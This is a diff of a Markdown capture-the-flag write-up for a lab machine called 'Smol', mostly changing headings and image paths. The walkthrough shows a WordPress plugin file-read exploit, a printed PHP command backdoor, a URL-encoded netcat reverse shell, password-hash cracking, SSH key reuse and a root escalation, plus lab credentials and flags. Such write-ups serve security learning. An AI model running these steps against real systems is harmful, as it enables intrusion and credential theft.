@@ -1,35 +1,35 @@
 ---
 sticker: emoji//1f628
 ---
+# ENUMERATION
+---
 
-# SMOL
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | ssh     |
 | 80   | http    |
 
 Let's visit the website, we need to add `www.smol.thm` to `/etc/hosts`:
 
-## RECONNAISSANCE
 
-***
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127152542.png)
+# RECONNAISSANCE
+---
+
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127152542.png)
 
 After going to the website, this the first thing we encounter, if we keep digging, we find the following:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127152619.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127152619.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127152626.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127152626.png)
 
 So, we can use `wpscan` to try to enumerate this website:
 
@@ -39,9 +39,11 @@ wpscan --url http://www.smol.thm
 
 Most interesting thing we can find in the scan is the following:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127155936.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127155936.png)
 
 If we search for an exploit related to this plugin, we find `CVE-2018-20462`, let's take a look:
+
 
 ```
 ChatGPT translation of the page that doesn't render in archive.org:
@@ -90,31 +92,36 @@ http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php
 The report describes two vulnerabilities in a WordPress plugin called "jsmol2wp". The first vulnerability is an arbitrary file read and server-side request forgery (SSRF) vulnerability (CVE-2018-20463) which can be exploited by controlling the $query parameter of file_get_contents in the jsmol.php file. The second vulnerability is a reflected cross-site scripting (XSS) vulnerability (CVE-2018-20462) which can be exploited by encoding the payload in BASE64. The report provides proof-of-concept (POC) examples for each vulnerability.
 ```
 
-This talks about an arbitrary file read, let's follow the PoC and visit
+
+
+This talks about an arbitrary file read, let's follow the PoC and visit 
 
 `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php`
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127160431.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127160431.png)
 
 It indeed works, we got some credentials: `wpuser`:`kbLSF2Vop#lw3rjDZ629*Z%G`, we can test those credentials at: `http://www.smol.thm/wp-login.php`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127160614.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127160614.png)
 
-## EXPLOITATION
 
-***
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127160833.png)
+
+# EXPLOITATION
+---
+
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127160833.png)
 
 We got access to the WordPress panel, let's look around for anything that could get as a shell:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127160915.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127160915.png)
 
 If we go to `pages`, we can see something called `Webmaster Tasks`, if we check the file, we can find the following:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127160952.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127160952.png)
 
-Most important thing would be the first thing on the list, which talks about a backdoor on the `Hello Dolly` plugin, using the same PoC from earlier, we can make a request to:
+Most important thing would be the first thing on the list, which talks about a backdoor on the `Hello Dolly` plugin, using the same PoC from earlier, we can make a request to: 
 
 ```
 http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php
@@ -122,17 +129,18 @@ http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=g
 
 And view the contents of the plugin:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127161117.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127161117.png)
 
 We can see the following line on the code, let's decode the base64:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127161206.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127161206.png)
 
-We got `if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }` , we can decode the variable names using:
+We got `if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); } `, we can decode the variable names using:
 
 `php -r 'echo "\143\155\x64" . ":" . "\143\x6d\144";'`
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127161313.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127161313.png)
 
 We got `cmd`, let's breakdown the functionality of the backdoor:
 
@@ -142,41 +150,44 @@ We got `cmd`, let's breakdown the functionality of the backdoor:
 3. The decoded code runs what's been passed using `cmd` `GET` parameter using `system` function.
 ```
 
+
 We can go to the dashboard and we can check that the plugin is running there:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127161615.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127161615.png)
 
 So, we could send a decoded reverse shell in the following way, we would need to visit this URL:
 
 `http://www.smol.thm/wp-admin/?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20IP%20PORT%20%3E%2Ftmp%2Ff`
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127161756.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127161756.png)
 
-As we can see, we got a shell, let's make it \[\[CYBERSECURITY/Commands/Shell Tricks/STABLE SHELL.md|stable]] ![](gitbook/cybersecurity/images/Pasted%20image%2020250127161921.png)
+As we can see, we got a shell, let's make it [[CYBERSECURITY/Commands/Shell Tricks/STABLE SHELL.md|stable]]
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127161921.png)
 
 Nice, now we can begin with privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+# PRIVILEGE ESCALATION
+---
 
 We already got ourselves a shell, let's list up users:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127161957.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127161957.png)
 
 We got four users, since we already got credentials for the SQL database, let's check if there's credentials for some other user:
 
+
 `mysql -u wpuser -p'kbLSF2Vop#lw3rjDZ629*Z%G' -D wordpress`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127162224.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127162224.png)
 
 Most important one would be `wp_users`, let's list its contents:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127162347.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127162347.png)
 
 We can filter it our by using: `select user_login,user_pass from wp_users;`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127162418.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127162418.png)
 
 We got the hashes and the usernames, we can crack them using john:
 
@@ -190,43 +201,45 @@ xavi:$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1
 
 `john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127163116.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127163116.png)
 
-After a while, we get the password for user `diego`, let's switch users:
+After a while, we get the password for user `diego`,  let's switch users:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127163150.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127163150.png)
 
 Nice, let's check our privileges and group memberships:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127163238.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127163238.png)
 
 We got no sudo permissions, however, we are part of `internal`, which means we are able to read other user's home directories, let's read them all:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127163341.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127163341.png)
 
 If we read `think`'s home, we can discover `.ssh`, let's check if there's any `id_rsa`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127163419.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127163419.png)
 
 Lucky, let's copy the contents and login using ssh:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127163545.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127163545.png)
 
 We can now check the PAM configuration for `su`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127163711.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127163711.png)
 
 This means that if we use `su` on user `gege` while we are user `think`, we'll be able to switch users successfully without a password needed:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127163759.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127163759.png)
 
 Let's check our home directory:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127163843.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127163843.png)
 
 We got a file `wordpress.old.zip`, let's send it to our machine:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127164218.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127164218.png)
 
 If we try unzipping the file, we need a password, let's use john to attempt to crack it:
 
@@ -238,29 +251,30 @@ If we try unzipping the file, we need a password, let's use john to attempt to c
 
 We get the following:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127164351.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127164351.png)
 
 Password is: `hero_gege@hotmail.com`, let's unzip the file:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127164502.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127164502.png)
 
 We got a `wp-config.php` file:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127164524.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127164524.png)
 
 We got the credentials for `xavi`:`P@ssw0rdxavi@`
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127164554.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127164554.png)
 
 Let's check our privileges:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127164617.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127164617.png)
 
 We can run any command, let's simply switch to root and get both flags:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127164658.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127164658.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127164744.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127164744.png)
 
 ```ad-important
 User: `45edaec653ff9ee06236b7ce72b86963`
@@ -269,4 +283,5 @@ Root: `bf89ea3ea01992353aef1f576214d4e4`
 
 Just like that, machine is done!
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250127164841.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250127164841.png)
+
